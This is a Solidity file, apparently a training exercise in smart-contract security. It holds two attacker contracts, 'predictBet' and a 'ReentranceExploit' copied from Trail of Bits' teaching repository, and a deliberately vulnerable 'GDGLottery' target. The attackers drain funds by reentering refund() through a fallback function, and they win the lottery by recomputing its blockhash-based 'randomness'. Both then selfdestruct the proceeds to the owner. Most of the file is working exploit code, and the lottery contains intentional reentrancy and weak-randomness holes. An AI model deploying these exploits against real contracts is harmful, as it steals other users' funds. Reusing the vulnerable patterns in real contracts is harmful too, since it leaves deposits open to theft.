pragma solidity ^0.4.24;

contract predictBet{
    address public vulnerable_contract;
    address public owner;
    
    function predictBet() public{
            owner = msg.sender;
        }
    
   function deposit(address _vulnerable_contract) public payable{
        vulnerable_contract = _vulnerable_contract ;
        require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("deposit()"))));
    }
    
    function launch_attack() public{
        require(vulnerable_contract.call(bytes4(sha3("refund()"))));
    }  
   
   function win() public{
        byte toGuess = byte(blockhash(block.number-1));
        GDGLottery instance = GDGLottery(vulnerable_contract);
        // require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("bet()")), msg.value));
        instance.bet(toGuess);
        //vulnerable_contract.call(bytes4(sha3("bet()")));
   }
   
   function get_money(){
        suicide(owner);
    }
   
   
}

contract GDGLottery {

    mapping (address => uint) public userBets;

    constructor() public {}

    function deposit() public payable {
        // TODO :mettre en ether
        require(msg.value > 1);
        
        userBets[msg.sender] = msg.value;
        emit LogUserPlayed(msg.sender, msg.value, contractBalance());
    }
    
    function refund() public {
        uint refund = userBets[msg.sender];
        if(!msg.sender.call.value(refund)()) {
            throw;
        }
        userBets[msg.sender] = 0;
        emit LogUserRefunded(msg.sender, refund, contractBalance());
    }

    function bet(byte char) public {
        // TODO en ether
        require(userBets[msg.sender] >= 1);

        byte toGuess = byte(blockhash(block.number-1));
        
        if (toGuess == char) {
            userBets[msg.sender] = contractBalance() / 10;
            emit LogUserWinner(msg.sender, contractBalance());
        } else {
            userBets[msg.sender] = 0;
            emit LogUserLooser(msg.sender);
        }
    }
    
    // Utilities
    function getBalance(address u) constant returns(uint){
        return userBets[u];
    }
    function contractBalance() public view returns(uint) {
        return address(this).balance;
    }

    event LogUserPlayed(address sender, uint amount, uint jackpot);
    event LogUserRefunded(address recipient, uint amount, uint jackpot);
    event LogUserWinner(address winner, uint jackpot);
    event LogUserLooser(address winner);
    
    function random(uint upper) public view returns (uint randomNumber) {
        uint _seed = uint(keccak256(blockhash(block.number)));
        return _seed % upper;
    }
}
pragma solidity ^0.4.19;


    // Trailofbits : (Not So) Smart Contracts
    //https://github.com/trailofbits/not-so-smart-contracts/blob/master/reentrancy/ReentrancyExploit.sol
    pragma solidity ^0.4.15;

    contract ReentranceExploit {
        bool public attackModeIsOn=false; 
        address public vulnerable_contract;
        address public owner;

        function ReentranceExploit() public{
            owner = msg.sender;
        }

        function deposit(address _vulnerable_contract) public payable{
            vulnerable_contract = _vulnerable_contract ;
            // call addToBalance with msg.value ethers
            require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("deposit()"))));
        }

        function launch_attack() public{
            attackModeIsOn = true;
            // call withdrawBalance
            // withdrawBalance calls the fallback of ReentranceExploit
            require(vulnerable_contract.call(bytes4(sha3("refund()"))));
        }  


        function () public payable{
            // atackModeIsOn is used to execute the attack only once
            // otherwise there is a loop between withdrawBalance and the fallback function
            if (attackModeIsOn){
                attackModeIsOn = false;
                    require(vulnerable_contract.call(bytes4(sha3("refund()"))));
            }
        }
    
        function get_money(){
            suicide(owner);
        }

    }
